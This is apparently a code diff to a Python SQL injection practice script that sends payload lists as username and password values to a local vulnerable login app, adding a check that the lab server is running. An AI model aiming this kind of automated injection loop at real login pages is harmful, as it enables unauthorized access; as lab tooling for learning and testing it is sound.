@@ -37,6 +37,15 @@ pay = [
 
 def SqlAtcking():
     Succes=0
+    url = "http://localhost:5002/login/"
+    try:
+        head = requests.head(url, timeout=5)
+        if head.status_code == 404:
+            print("[!] URL 404, please first run ** python3 VulnLogin.py")
+            return
+    except:
+        print("[!] URL not reachable, please first run ** python3 VulnLogin.py")
+        return
     print("""
         Choice payload methods :
              1. config 1  =>  username: payload , password: 1
@@ -55,7 +64,7 @@ def SqlAtcking():
                 "username":payload,
                 "password":payload
             }," username: payload, password: payload"]
-        elif c == "3":   
+        elif c == "3":
             config=[{
                 "username":"1",
                 "username":payload
@@ -67,7 +76,7 @@ def SqlAtcking():
                 "password": "1"
            },"username: payload, password: 1"]
         try:
-            r = requests.post("http://localhost:5002/login/", data=config[0])
+            r = requests.post(url, data=config[0])
         except Exception as e:
             print(f"Request failed for payload: {payload}\nErro")
             continue
